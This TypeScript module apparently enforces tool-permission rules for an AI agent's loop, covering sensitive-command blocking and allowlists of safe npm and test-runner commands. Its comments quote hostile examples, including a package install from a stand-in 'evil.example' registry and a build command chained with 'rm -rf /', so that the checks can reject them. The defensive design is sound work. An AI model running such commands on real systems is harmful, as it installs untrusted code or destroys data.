/* managedToolPermissions — wires toolPermissions.ts's glob-based
   allow/ask/exclude engine (rule shapes, resolvePermission, brain-learned
   rules) into the managed loop's tool-execution gate.

   Extracted as its own module (rather than growing managedAgentPolicy.ts
   further) to keep each file small and single-purpose — see CLAUDE.md's
   file-size guidance and managedAgentPolicy.ts's own header, which was
   split out of managedAgent.ts for the same reason.

   Layered AFTER managedAgentPolicy.checkToolPolicy via checkToolExecution
   below, the single entry point managedAgent.ts's executeTool calls:
     1. checkToolPolicy      — plan-mode + the mission's explicit
                                allowedTools/deniedTools. Hard, checked
                                first — untouched by this module.
     2. checkToolPermission  — toolPermissions rules (project/user-
                                configured, or brain-learned), matched
                                against the tool name AND — for
                                run_command — the actual command string,
                                not just "run_command".
   A denial from either layer is an "ERROR: …" string fed back to the model
   as a normal observation (never a silent skip), which the loop already
   counts toward MAX_CONSECUTIVE_FAILURES like any other failed step.

   One-directional dependency: this module imports from managedAgentPolicy
   (checkToolPolicy/ToolPolicy) and toolPermissions (the engine itself);
   managedAgent.ts imports from this module (and from managedAgentPolicy.ts
   directly for persona/prompt concerns). Nothing imports back from
   managedAgent.ts, so no cycle.
*/

import type { PermissionMode } from './runtime.js';
import { checkToolPolicy } from './managedAgentPolicy.js';
import type { ToolPolicy } from './managedAgentPolicy.js';
import { getMergedRules, matchesPattern, resolvePermission } from './toolPermissions.js';
import type { AgentPermissionMode, PermissionRule } from './toolPermissions.js';
import { classifySensitiveCommand } from './sensitiveCommands.js';
import type { SensitiveClassification } from './sensitiveCommands.js';
import { isWorktreeScriptCommand } from './worktreeScriptCommands.js';

export type { AgentPermissionMode } from './toolPermissions.js';

/**
 * Maps a managedAgent tool action to the pattern-space tool name
 * toolPermissions rules are written against (Continue-style names, see
 * toolPermissions.ts's header — Read/Write/Edit/Bash/...). run_tests and
 * brain_record have no Continue analog, so they get Lazy-specific pattern
 * names of their own (still individually rule-addressable).
 */
const TOOL_PATTERN_NAME: Record<string, string> = {
  // Navigation
  read_file: 'Read',
  read_dir: 'List',
  glob: 'Glob',
  grep_file: 'Grep',
  find_file: 'Glob',
  search_code: 'Grep',
  search_symbols: 'Grep',
  goto_definition: 'Read',
  find_references: 'Read',
  get_diagnostics: 'Read',
  // Edit
  write_file: 'Write',
  edit_file: 'Edit',
  multi_edit: 'Edit',
  undo_edit: 'Edit',
  rename_file: 'Write',
  delete_file: 'Write',
  // Exec
  run_command: 'Bash',
  run_tests: 'RunTests',
  run_lint: 'Bash',
  run_build: 'Bash',
  // Git
  git_status: 'Read',
  git_diff: 'Read',
  git_log: 'Read',
  git_commit: 'Write',
  git_create_pr: 'Write',
  review_diff: 'Read',
  // Web
  web_search: 'Search',
  web_fetch: 'Search',
  check_url: 'Search',
  // Brain
  brain_query: 'Search',
  brain_query_css: 'Search',
  brain_neighbours: 'Search',
  brain_record: 'BrainRecord',
  brain_synthesize: 'Search',
  // Transform (W-CODE — sandboxed pure computation, see transformSandbox.ts)
  list_transforms: 'ListTransforms',
  run_transform: 'RunTransform',
  // MCP
  mcp_list_tools: 'Search',
  mcp_call: 'Bash',
  // Browser
  browser_open: 'Bash',
  browser_navigate: 'Search',
  browser_click: 'Bash',
  browser_fill: 'Bash',
  browser_screenshot: 'Read',
  browser_snapshot: 'Read',
  browser_close: 'Bash',
  // Orchestration
  delegate: 'Read',
  ask_user: 'Read',
};

/**
 * Managed-loop-specific safe defaults, one per TOOL_PATTERN_NAME entry, all
 * 'allow' — appended at the LOWEST precedence (after any real project/user/
 * brain-learned rule) when resolving a permission, so a configured rule
 * always wins but a fresh install with nothing configured behaves exactly
 * as it does today: every managed tool proceeds.
 *
 * Deliberately NOT toolPermissions.DEFAULT_RULES: those ask-by-default for
 * Write/Edit/Bash, which assumes a synchronous interactive prompt surface
 * (Continue-style). The managed loop doesn't have one yet — an unanswered
 * 'ask' fails CLOSED here (see checkToolPermission) — so inheriting that
 * posture would silently turn every unconfigured mission's write_file/
 * edit_file/run_command into a hard block. That would be a far bigger
 * behavior change than the audit's actual CRITICAL finding (the auto-mode
 * exclude bypass, and run_command's un-gated command content — both fixed
 * below without touching this default-allow floor). Tightening the
 * out-of-the-box default is a legitimate follow-up product decision, not
 * this fix's job — a user, or the brain-learned-rule pipeline, can already
 * tighten it today by adding an explicit 'ask'/'exclude' project/user rule
 * for any of these patterns.
 */
const MANAGED_TOOL_SAFE_DEFAULTS: PermissionRule[] = Object.values(TOOL_PATTERN_NAME).map(
  (pattern): PermissionRule => ({
    pattern,
    level: 'allow',
    source: 'default',
    createdAt: '',
    description: 'Managed-loop default (unconfigured) — see MANAGED_TOOL_SAFE_DEFAULTS',
  }),
);

/**
 * Builds the rule set the managed loop resolves tool calls against:
 * explicit project + user rules (brain-learned rules persist as
 * 'user'-sourced — see toolPermissions.recordPermissionDecision) in their
 * normal precedence, then the managed-loop safe-allow floor above.
 * Excludes toolPermissions.DEFAULT_RULES on purpose — see
 * MANAGED_TOOL_SAFE_DEFAULTS's doc comment. Re-read on every call (no
 * caching), consistent with toolPermissions.ts's own load*Permissions().
 */
export function buildManagedPermissionRules(): PermissionRule[] {
  return [...getMergedRules().filter((r) => r.source !== 'default'), ...MANAGED_TOOL_SAFE_DEFAULTS];
}

/**
 * Derives the toolPermissions mode axis for a mission when the caller
 * doesn't pass one explicitly:
 *   - 'plan' -> 'readonly'   same read-only intent, enforced twice
 *                            (checkToolPolicy already hard-blocks
 *                            write/exec tools under plan mode — this is
 *                            defense in depth, not the primary gate).
 *   - 'full' -> 'auto'       the mission's "no tool restrictions" tier
 *                            reads as "runs without a human vetting every
 *                            step" (the UI already flags it with a warning
 *                            — see NewMissionModal's permFullWarning).
 *   - otherwise -> 'default' normal rule resolution.
 */
export function resolveManagedAgentMode(
  explicitMode: AgentPermissionMode | undefined,
  permissionMode: PermissionMode | undefined,
): AgentPermissionMode {
  if (explicitMode) return explicitMode;
  if (permissionMode === 'plan') return 'readonly';
  if (permissionMode === 'full') return 'auto';
  return 'default';
}

/**
 * The argument a tool call is rule-matched against — e.g. a rule like
 * Bash(rm -rf*) must see the actual command text, not just the tool name,
 * so run_command specifically needs args.command (not the generic
 * "primary path" most other tools use).
 */
function toolPermissionArg(action: string, args: Record<string, unknown>): string | undefined {
  switch (action) {
    case 'run_command':
    case 'run_lint':
    case 'run_build':
      return args.command !== undefined ? String(args.command) : undefined;
    case 'glob':
    case 'find_file':
      return args.pattern !== undefined ? String(args.pattern) : undefined;
    case 'search_code':
    case 'search_symbols':
      return args.pattern !== undefined ? String(args.pattern) : (args.query !== undefined ? String(args.query) : undefined);
    case 'brain_query':
    case 'brain_synthesize':
      return args.query !== undefined ? String(args.query) : (args.topic !== undefined ? String(args.topic) : undefined);
    case 'brain_query_css':
      return args.selector !== undefined ? String(args.selector) : undefined;
    case 'brain_neighbours':
      return args.id !== undefined ? String(args.id) : undefined;
    case 'web_search':
      return args.query !== undefined ? String(args.query) : undefined;
    case 'web_fetch':
    case 'check_url':
      return args.url !== undefined ? String(args.url) : undefined;
    case 'run_transform':
      return args.tool_id !== undefined ? String(args.tool_id) : undefined;
    case 'delegate':
      return args.task !== undefined ? String(args.task) : undefined;
    case 'ask_user':
      return args.question !== undefined ? String(args.question) : undefined;
    case 'mcp_list_tools':
      return args.server !== undefined ? String(args.server) : undefined;
    case 'mcp_call':
      return args.tool !== undefined ? String(args.tool) : undefined;
    case 'browser_navigate':
      return args.url !== undefined ? String(args.url) : undefined;
    case 'browser_click':
    case 'browser_fill':
      return args.selector !== undefined ? String(args.selector) : undefined;
    case 'read_file':
    case 'edit_file':
    case 'write_file':
    case 'multi_edit':
    case 'undo_edit':
    case 'rename_file':
    case 'delete_file':
    case 'read_dir':
    case 'grep_file':
    case 'goto_definition':
    case 'find_references':
    case 'get_diagnostics':
    case 'git_status':
    case 'git_diff':
    case 'git_log':
    case 'git_commit':
    case 'git_create_pr':
    case 'review_diff':
      return args.path !== undefined ? String(args.path) : undefined;
    default:
      return undefined;
  }
}

/**
 * Finds the rule (if any) that decided this tool call's resolvePermission
 * verdict — the same "first match in precedence order" scan resolvePermission
 * itself does, exposed here so callers can inspect what actually matched
 * (its pattern, for messages; its source, for the sensitive-command gate
 * below).
 */
function findMatchingRule(
  rules: PermissionRule[],
  patternName: string,
  toolArg: string | undefined,
): PermissionRule | undefined {
  return rules.find((r) => matchesPattern(r.pattern, patternName, toolArg));
}

/**
 * Builds the fail-closed denial message for a sensitive run_command call
 * that only reached 'allow' via the managed-loop's safe-allow floor (no
 * explicit user/project/brain/cli rule covers it) — see checkToolPermission's
 * sensitive-command gate. The message names the category and reason so the
 * model (and whoever reads the mission log) understands exactly what was
 * blocked and why, and always names the documented escape hatch: an explicit
 * allow rule for this command pattern.
 */
function sensitiveCommandDenialMessage(
  classification: SensitiveClassification,
  agentMode: AgentPermissionMode,
): string {
  const category = classification.category ?? 'sensitive operation';
  const reason = classification.reason ?? 'this command shape is treated as dangerous by default';
  if (agentMode === 'auto') {
    return `ERROR: run_command blocked — sensitive operation (${category}): ${reason}. Running unattended, no approval is possible. Add an explicit allow rule for this command pattern in Settings → Permissions to permit it.`;
  }
  return `ERROR: run_command requires explicit approval — sensitive operation (${category}): ${reason}. Add an explicit allow rule (Settings → Permissions) for this command pattern to permit it.`;
}

/**
 * Package-manager subcommands safe enough to auto-allow even under an
 * ask-tier Bash rule — see the 'ask' branch of checkToolPermission below.
 *
 * Real dogfood bug this fixes: a mission's build/lint/typecheck
 * verification step is "structurally impossible" once `npm`/`npx`/`yarn`/
 * `pnpm` fall under an ask-tier Bash rule, because 'ask' has no synchronous
 * approval surface yet (see checkToolPermission's doc comment) and fails
 * closed in EVERY mode — so an unattended mission can never get past
 * `npm install` or `npm run build`, even though those are exactly the
 * commands a build/lint verification mission needs to run. `node -v`
 * already worked (nothing gates it); this brings the equivalent
 * package-manager commands to the same tier.
 *
 * Deliberately a tight, exact-shape ALLOWLIST, not a denylist: only version
 * checks, dependency install, and the project's own build/lint/test/
 * typecheck scripts qualify (PM_SAFE_SHAPES). Everything dangerous —
 * publish, adduser, config set, cache clean --force, arbitrary
 * `run <script>` outside this fixed set — is simply absent from the
 * allowlist and therefore never matches; no explicit denylist entry is
 * needed for those. `--registry` and `login` get an extra defense-in-depth
 * check below because they could otherwise ride along AFTER an
 * already-matched safe prefix (e.g. "npm install --registry
 * http://evil.example") — the "trailing flags are OK" allowance (meant for
 * legitimate cases like "npm run build --silent") would otherwise wave
 * that through too.
 *
 * Only the plain single-command form qualifies: any chaining/piping/
 * redirection character disqualifies the WHOLE command, so
 * "npm run build && rm -rf /" is never eligible just because its first
 * segment looks safe (mirrors worktreeScriptCommands.ts's FORBIDDEN_CHARS
 * rule — kept as a separate local copy here since this check is NOT
 * worktree-scoped and does not go through that module's Rust-side
 * re-validation; see isWorktreeScriptBypassEligible's doc comment for that
 * separate, narrower, worktree-only mechanism).
 */
const PACKAGE_MANAGER_NAMES = ['npm', 'npx', 'yarn', 'pnpm'];

const PM_SAFE_SHAPES: ReadonlyArray<ReadonlyArray<string>> = [
  ['-v'],
  ['--version'],
  ['install'],
  ['ci'],
  ['run', 'build'],
  ['run', 'lint'],
  ['run', 'test'],
  ['run', 'typecheck'],
  ['exec', 'eslint'],
  ['exec', 'tsc'],
];

/** Same conservative rule as worktreeScriptCommands.ts's FORBIDDEN_CHARS:
 *  any of these turns a single literal invocation into a shell pipeline/
 *  chain/substitution/redirection, so the command can no longer be assumed
 *  to be JUST the safe leading command. */
const PM_COMMAND_CHAIN_CHARS = ['&', '|', ';', '\n', '\r', '`', '$', '>', '<'];

/**
 * True when `command` is a literal invocation of one of the allowlisted
 * package-manager version/install/build/lint/test/typecheck shapes above —
 * never true for a command carrying chaining/piping/redirection/
 * substitution characters, or a dangerous trailing flag/verb
 * (`--registry`, `login`), regardless of what precedes them.
 */
export function isSafePackageManagerCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed) return false;
  if (PM_COMMAND_CHAIN_CHARS.some((ch) => trimmed.includes(ch))) return false;

  const tokens = trimmed.split(/\s+/).filter(Boolean);
  if (tokens.length < 2) return false;

  const manager = tokens[0].toLowerCase();
  if (!PACKAGE_MANAGER_NAMES.includes(manager)) return false;

  const rest = tokens.slice(1);
  const hasDangerousTrailer = rest.some((t) => {
    const lower = t.toLowerCase();
    return lower === 'login' || lower.startsWith('--registry');
  });
  if (hasDangerousTrailer) return false;

  return PM_SAFE_SHAPES.some((shape) =>
    shape.every((expected, i) => rest[i]?.toLowerCase() === expected),
  );
}

/**
 * Test runners safe enough to auto-allow under an ask-tier Bash rule, on
 * top of the package-manager override above.
 *
 * Real dogfood bug this fixes (QA use-case testing, 2026-08-08): a
 * verification mission that runs `node --test debounce.test.mjs` directly
 * (NOT via `npm run test`) was blocked by the ask-tier Bash rule — the
 * project has no package.json, or the mission calls the runner directly —
 * so the tester could never execute the tests and the mission was judged
 * RECALÉE with "blocage d'approbation système". The package-manager
 * allowlist covers `npm run test`, but not a direct `node --test`, `pytest`,
 * or `vitest run` invocation. These are exactly the commands a
 * build/lint/test verification mission needs.
 *
 * Tight, exact-shape allowlist (same philosophy as PM_SAFE_SHAPES): only
 * test-runner invocations that run the project's own tests qualify. Any
 * chaining/piping/redirection disqualifies the whole command, and dangerous
 * flags (a path to an outside executable, `--eval`, `-e`, `-c`, `--input-type`)
 * never match.
 */
const TEST_RUNNER_NAMES = ['node', 'pytest', 'vitest', 'npx'];
// Shapes matched against the tokens AFTER the leading verb (rest):
//  - `vitest run`    -> rest = ['run']
//  - `npx vitest`    -> rest = ['vitest']
//  - `npx vitest run`-> rest = ['vitest', 'run']
const TEST_RUNNER_SAFE_SHAPES: ReadonlyArray<ReadonlyArray<string>> = [
  ['run'],
  ['vitest'],
  ['vitest', 'run'],
];

export function isSafeTestCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed) return false;
  if (PM_COMMAND_CHAIN_CHARS.some((ch) => trimmed.includes(ch))) return false;

  const tokens = trimmed.split(/\s+/).filter(Boolean);
  if (tokens.length < 1) return false;

  const verb = tokens[0].toLowerCase();
  if (!TEST_RUNNER_NAMES.includes(verb)) return false;

  // `node --test [files...]`: forbid dangerous node flags anywhere in the
  // invocation (eval/exec/input), but allow test file paths after --test.
  if (verb === 'node') {
    if (!tokens.includes('--test')) return false;
    if (tokens.some((t) => ['-e', '--eval', '--input-type', '-c', '--check'].includes(t.toLowerCase()))) return false;
    return true;
  }

  // pytest: any invocation without dangerous flags is a test run.
  if (verb === 'pytest') return true;

  // vitest / npx vitest run [args...]: forbid obvious danger flags.
  if (tokens.some((t) => ['-e', '--eval', '--input-type'].includes(t.toLowerCase()))) return false;

  const rest = tokens.slice(1);
  // `vitest` alone is safe: it runs the project's tests with defaults.
  // `npx` alone is NOT (it prompts to install/run arbitrary packages).
  if (rest.length === 0 && verb === 'vitest') return true;

  return TEST_RUNNER_SAFE_SHAPES.some((shape) =>
    shape.every((expected, i) => rest[i]?.toLowerCase() === expected),
  );
}

/**
 * Resolves + enforces the toolPermissions verdict for one tool call.
 * Returns null when permitted, or an "ERROR: …" observation when blocked —
 * same contract as checkToolPolicy, so a denial is fed back to the model
 * like any other observation (a visible failed step, never a silent skip)
 * and correctly counts toward MAX_CONSECUTIVE_FAILURES escalation.
 *
 *  - 'exclude' -> hard deny, ALWAYS, regardless of mode. This is the fix
 *    for the audit's CRITICAL finding: resolvePermission no longer lets
 *    'auto' mode bypass an explicit exclusion (see its doc comment in
 *    toolPermissions.ts).
 *  - 'allow'   -> proceed, UNLESS this is a `run_command` call whose command
 *    text classifySensitiveCommand (sensitiveCommands.ts) flags as sensitive
 *    (force-push, publish, secret exfil, privilege escalation, absolute-path
 *    delete, ...) AND the rule that produced 'allow' is only the managed
 *    loop's synthetic safe-allow floor (MANAGED_TOOL_SAFE_DEFAULTS, always
 *    source 'default') rather than a real user/project/brain/cli rule
 *    someone actually configured. In that case the call fails closed — the
 *    all-allow floor exists so an unconfigured mission isn't dead on
 *    arrival, not so a prompt-injected agent can force-push or exfiltrate
 *    secrets unattended. A rule with any non-'default' source that matches
 *    the command is an explicit, human-authored decision and overrides the
 *    gate exactly as it overrides everything else here — the escape hatch
 *    is "add an allow rule for this pattern", never "trust the floor".
 *  - 'ask'     -> the managed loop has no synchronous interactive-approval
 *    surface today: pause (see managedAgent's module header) is a coarse,
 *    user-initiated whole-mission control with no way for the loop itself
 *    to request approval for one specific call and wait on it, and
 *    intervene is free-text steering, not a structured approve/deny
 *    channel — wiring a real one needs a new mission state + store method +
 *    UI (MissionDetailControls et al.), outside this module's ownership.
 *    Rather than half-build a fake approval flow (e.g. overloading
 *    intervene text as an implicit "approve" — the user would have no
 *    affordance even telling them that's possible), 'ask' fails closed in
 *    every mode: safe-by-default beats fake interactivity. The message
 *    still varies by mode to stay honest about *why*.
 *  - 'ask' + safe package-manager command -> ALLOW. A narrow override on
 *    top of the 'ask' branch above: `npm`/`npx`/`yarn`/`pnpm` version
 *    checks, install, and the project's own build/lint/test/typecheck
 *    scripts (see isSafePackageManagerCommand) proceed even under an
 *    ask-tier Bash rule, so a mission's build/lint verification is not
 *    structurally impossible just because no one is present to approve
 *    it. Deliberately narrower than the safe-allow floor: this does NOT
 *    touch 'exclude' above (still an unconditional hard deny) and does not
 *    affect any command outside the fixed allowlist — publish, config
 *    changes, arbitrary `run <script>`, and anything chained with
 *    &&/|/; still resolve through the normal ask handling below.
 */
export function checkToolPermission(
  action: string,
  args: Record<string, unknown>,
  agentMode: AgentPermissionMode = 'default',
  rules: PermissionRule[] = buildManagedPermissionRules(),
): string | null {
  const patternName = TOOL_PATTERN_NAME[action];
  if (!patternName) return null; // FINAL, or any tool this layer doesn't map

  const toolArg = toolPermissionArg(action, args);
  const level = resolvePermission(patternName, toolArg, rules, agentMode);

  if (level === 'allow') {
    if (action === 'run_command' && toolArg) {
      const classification = classifySensitiveCommand(toolArg);
      if (classification.sensitive) {
        const matchedRule = findMatchingRule(rules, patternName, toolArg);
        const hasExplicitAllow = matchedRule !== undefined && matchedRule.source !== 'default';
        if (!hasExplicitAllow) {
          return sensitiveCommandDenialMessage(classification, agentMode);
        }
      }
    }
    return null;
  }

  const describeMatch = (): string => {
    const matched = findMatchingRule(rules, patternName, toolArg);
    return matched ? `"${matched.pattern}"` : `"${patternName}"`;
  };

  if (level === 'exclude') {
    // resolvePermission's readonly branch short-circuits BEFORE consulting
    // `rules` at all — under 'readonly' mode every exclude verdict is the
    // mode's hard read-only ceiling, never a specific rule.
    if (agentMode === 'readonly') {
      return `ERROR: tool "${action}" is blocked — this run is restricted to read-only tools (readonly mode).`;
    }
    return `ERROR: tool "${action}" is excluded by permission rule ${describeMatch()} — denied unconditionally, this cannot be bypassed by mode (including unattended/auto runs).`;
  }

  // level === 'ask'
  if (action === 'run_command' && toolArg && (isSafePackageManagerCommand(toolArg) || isSafeTestCommand(toolArg))) {
    return null;
  }
  if (agentMode === 'auto') {
    return `ERROR: tool "${action}" is blocked by an ask-tier permission rule (${describeMatch()}) while running unattended — no one is present to approve it. Add an explicit "allow" rule for this pattern to permit it.`;
  }
  return `ERROR: tool "${action}" requires approval (ask-tier permission rule ${describeMatch()}) — interactive approval isn't available in this build yet, so ask-tier calls are denied by default (safe-by-default). Add an explicit "allow" rule for this pattern to permit it.`;
}

/**
 * Scoped worktree-script bypass (M12 dogfood fix, BLOQUANT #3): lets an
 * acceptEdits/full mission's run_command call reach toolRuntime.ts's scoped
 * Rust path (is_worktree_script_eligible / run_worktree_script, src-tauri/
 * src/commands/shell.rs) even when the general Bash permission rule is
 * ask/exclude — WITHOUT touching that general rule at all.
 *
 * Deliberately narrow, not a Bash bypass: only fires for `run_command`
 * calls whose command matches `isWorktreeScriptCommand` (the same
 * package.json-script / cargo build-test-check allowlist Rust enforces),
 * and only under 'acceptEdits'/'full' — the same unattended-but-execution-
 * capable modes that already let a mission edit files without a human
 * present. A 'plan' mission, or any run_command whose text does not match
 * the allowlist, is completely unaffected and falls through to the normal
 * checkToolPermission resolution below exactly as before.
 *
 * This function only decides whether the call is allowed to REACH
 * toolRuntime's 'run_command' case — the actual cwd-is-a-worktree check is
 * NOT re-derived here (this layer has no cwd, only the command string) and
 * is instead enforced authoritatively by the Rust command itself, which
 * re-validates from scratch. See worktreeScriptCommands.ts's header for the
 * full rationale and the TS/Rust mirroring convention.
 */
function isWorktreeScriptBypassEligible(
  action: string,
  args: Record<string, unknown>,
  policy: ToolPolicy,
): boolean {
  if (action !== 'run_command') return false;
  if (policy.permissionMode !== 'acceptEdits' && policy.permissionMode !== 'full') return false;
  const command = args.command !== undefined ? String(args.command) : '';
  return isWorktreeScriptCommand(command);
}

/**
 * Single entry point executeTool calls: checkToolPolicy's hard gates
 * (plan-mode, deniedTools, allowedTools) first, then the scoped
 * worktree-script bypass, then checkToolPermission's general rule-based
 * verdict — see this module's header comment for the full precedence
 * rationale, and isWorktreeScriptBypassEligible's doc comment for the
 * bypass itself.
 *
 * Precedence (audit CRITICAL fix): an explicit `exclude` rule is enforced
 * BEFORE the worktree-script bypass. The bypass is a narrow escape hatch
 * for ask/allow-tier Bash rules, NOT a way around a human-authored "never
 * run this" decision — so resolvePermission's exclude > ask > allow order
 * is consulted first, and only a non-exclude verdict may be bypassed.
 */
export function checkToolExecution(
  action: string,
  args: Record<string, unknown>,
  policy: ToolPolicy,
  agentMode: AgentPermissionMode = 'default',
  rules: PermissionRule[] = buildManagedPermissionRules(),
): string | null {
  const policyBlock = checkToolPolicy(action, policy);
  if (policyBlock) return policyBlock;

  // An explicit exclude rule (or the readonly mode ceiling, which
  // resolvePermission maps to 'exclude' for non-read tools) takes absolute
  // priority over the worktree-script bypass below — a hard "never run
  // this" decision must never be bypassed, even by the narrow acceptEdits/
  // full script escape hatch. Only ask/allow verdicts may be bypassed.
  const patternName = TOOL_PATTERN_NAME[action];
  if (patternName) {
    const toolArg = toolPermissionArg(action, args);
    const level = resolvePermission(patternName, toolArg, rules, agentMode);
    if (level === 'exclude') {
      return checkToolPermission(action, args, agentMode, rules);
    }
  }

  if (isWorktreeScriptBypassEligible(action, args, policy)) return null;
  return checkToolPermission(action, args, agentMode, rules);
}
